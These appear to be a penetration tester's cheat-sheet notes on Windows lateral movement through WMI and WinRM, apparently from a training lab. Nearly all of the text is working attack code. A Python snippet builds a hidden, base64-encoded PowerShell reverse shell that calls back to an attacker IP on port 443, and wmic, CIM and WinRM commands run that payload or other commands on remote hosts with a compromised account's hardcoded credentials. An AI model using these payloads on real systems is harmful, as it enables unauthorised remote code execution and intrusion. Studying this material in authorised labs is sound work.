#### Use Wmi
>>
// require Administrators local group, and login as a user in the compromised host, run this to make it for the target host
###### Rev_shell as base64
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

###### CMD
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
//change the payload command as rev shell to get a shell
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e JABjAGwAaQ<snip>"

```


###### PS
```
//create the credential
$username = 'jen';

$password = 'Nexus123!';

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

//create session

$options = New-CimSessionOption -Protocol DCOM

$session = New-Cimsession -ComputerName 192.168.123.72 -Credential $credential -SessionOption $Options

$command = 'calc'

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}
```

#### Use Winrm
###### CMD
`winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`
//replace command 

###### PS

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

//create a session other than revshell

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
> -- ----            ------------    ------------    -----         -----------------     ------------
>  1 WinRM1          192.168.123.72  RemoteMachine   Opened        Microsoft.PowerShell     Available

Enter-PSSession 1
```
